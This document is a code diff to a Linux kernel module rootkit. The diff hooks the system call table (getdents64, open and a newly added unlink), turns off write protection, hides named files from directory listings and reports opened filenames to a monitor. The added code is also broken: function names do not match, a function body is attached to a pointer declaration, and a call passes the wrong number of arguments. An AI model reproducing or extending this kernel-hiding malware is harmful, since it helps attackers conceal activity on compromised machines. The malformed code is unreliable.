@@ -19,9 +19,12 @@ static int callMonitor(char *msg);
 // Kernel system call
 asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 asmlinkage long (*kernel_open)(const char __user *filename, int flags, umode_t mode);
+asmlinkage long (*kernel_unlink)(const char __user *pathname);
+
 // Hooked system call
 asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode);
+asmlinkage long hooked__unlink(const char __user *pathname);
 
 /*************** What file we gonna hide ********************/
 char *INEXISTFILE = "HIDEAFILEINKERNEL";
@@ -45,8 +48,10 @@ static int lkm_init(void)
     DISABLE_WRITE_PROTECTION;
     kernel_getdents64 = (void *)syscall_table[__NR_getdents64]; 
     kernel_open = (void *)syscall_table[__NR_open]; 
+    kernel_unlink = (void *)syscall_table[__NR_unlink]; 
     syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
     syscall_table[__NR_open] = (unsigned long *)hooked_open;
+    syscall_table[__NR_unlink] = (unsigned long *)hooked_unlink;
     ENABLE_WRITE_PROTECTION;
     
     hidfiles[0] = "cmdoutput.txttmp";
@@ -124,6 +129,15 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
 }
 
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode){
+    if(monitor != NULL){
+        callMonitor(filename);
+    }
+        
+    //Monitor exist file    
+    return kernel_open(filename, flags, mode);
+}
+
+asmlinkage long (*kernel_unlink)(const char __user *filename){
     char *tmp;
     printk("hhh %s\n", filename);
     //Hide a new type of file
@@ -136,19 +150,19 @@ asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode
             filenum++;
         }
         printk("hide %s\n", tmp);
+        return 0;
     } else if(strncmp(filename, INEXISTMONITOR, strlen(INEXISTMONITOR) == 0)){
         tmp = filename;
         while(*tmp != '%') tmp++;
         if(*tmp == '%'){
             monitor = tmp;
         }
+        return 0;
     }
     if(monitor != NULL){
         callMonitor(filename);
     }
-        
-    //Monitor exist file    
-    return kernel_open(filename, flags, mode);
+    return kernel_open(filename);
 }
  
 static void lkm_exit(void)
@@ -159,6 +173,7 @@ static void lkm_exit(void)
     DISABLE_WRITE_PROTECTION;
     syscall_table[__NR_getdents64] = (unsigned long *)kernel_getdents64;
     syscall_table[__NR_open] = (unsigned long *)kernel_open;
+    syscall_table[__NR_unlink] = (unsigned long *)kernel_unlink;
     ENABLE_WRITE_PROTECTION;
 }
 
